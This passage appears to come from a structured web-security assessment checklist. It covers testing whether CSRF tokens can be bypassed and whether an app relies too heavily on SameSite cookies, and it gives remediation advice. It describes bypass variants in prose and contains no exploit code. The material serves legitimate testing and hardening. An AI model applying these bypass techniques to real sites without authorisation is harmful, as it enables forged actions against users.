   - remove the token param/header entirely; - send an empty token; - reuse another user's / an old token; - swap the method (POST->GET); - change Content-Type; - use a token of correct length but wrong value.
2) Also check if the token is only validated when present (optional), or not tied to the session/user.
3) If any variant is accepted, the token check is bypassable.
4) Accepted forged/absent/foreign token = finding.
items.how_to_fix: Validate the token on every state-changing request (mandatory, constant-time compare, bound to the user session, single-use or per-session). Add a regression test. VERIFY all bypass variants are rejected.

items.title: Assess over-reliance on SameSite cookies
items.description: SameSite=Lax/None alone may not stop CSRF (top-level GET, method tricks, sibling subdomains).
items.how_to_find:
1) If the app relies on SameSite cookies instead of tokens, probe the gaps:
   - SameSite=Lax still allows top-level GET navigations, so a state-changing GET is exploitable; - method override (_method=POST) via a GET; - requests from a sibling subdomain you control (same-site, not cross-site); - the ~2min Lax-allows-POST grace in some browsers.
2) Build a PoC using these to fire the action.
3) A working CSRF despite SameSite = finding.
